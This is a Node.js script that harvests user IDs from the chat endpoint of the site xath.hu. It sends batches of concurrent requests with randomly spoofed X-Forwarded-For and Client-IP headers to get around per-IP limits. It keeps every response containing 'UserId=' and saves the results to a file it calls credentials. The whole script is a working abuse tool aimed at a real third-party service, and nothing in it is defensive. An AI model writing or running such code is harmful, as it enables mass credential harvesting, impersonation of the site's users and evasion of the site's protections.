'use strict';

const https = require('https');
const fs = require('fs');
const path = require('path');

const OUT_FILE = path.join(__dirname, 'listids_xath.txt');
const TOTAL = parseInt(process.argv[2], 10) || 600;
const CONCURRENCY = 20;

function fetchOneId() {
    return new Promise((resolve) => {
        const ip = [
            Math.floor(Math.random() * 200 + 10),
            Math.floor(Math.random() * 250),
            Math.floor(Math.random() * 250),
            Math.floor(Math.random() * 250)
        ].join('.');

        const req = https.get('https://xath.hu/web_gear/chat/auser3.php', {
            headers: {
                'X-Forwarded-For': ip,
                'Client-IP': ip,
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 6000
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const line = data.trim();
                if (line.includes('UserId=')) {
                    resolve(line);
                } else {
                    resolve(null);
                }
            });
        });

        req.on('error', () => resolve(null));
        req.on('timeout', () => {
            req.destroy();
            resolve(null);
        });
    });
}

async function run() {
    console.log(`[GENERATOR] Harvesting ${TOTAL} unique IDs from xath.hu...`);
    const results = new Set();
    if (fs.existsSync(OUT_FILE)) {
        const lines = fs.readFileSync(OUT_FILE, 'utf8').split('\n').map(l => l.trim()).filter(Boolean);
        for (const l of lines) results.add(l);
    }
    const target = results.size + TOTAL;

    while (results.size < target) {
        const batchSize = Math.min(CONCURRENCY, target - results.size);
        const promises = [];
        for (let i = 0; i < batchSize; i++) {
            promises.push(fetchOneId());
        }
        const batchRes = await Promise.all(promises);
        for (const item of batchRes) {
            if (item) results.add(item);
        }
        process.stdout.write(`\rHarvested: ${results.size}/${target}`);
    }

    console.log('\n[GENERATOR] Done!');
    fs.writeFileSync(OUT_FILE, Array.from(results).join('\n'), 'utf8');
    console.log(`Saved ${results.size} credentials to ${OUT_FILE}`);
}

run();
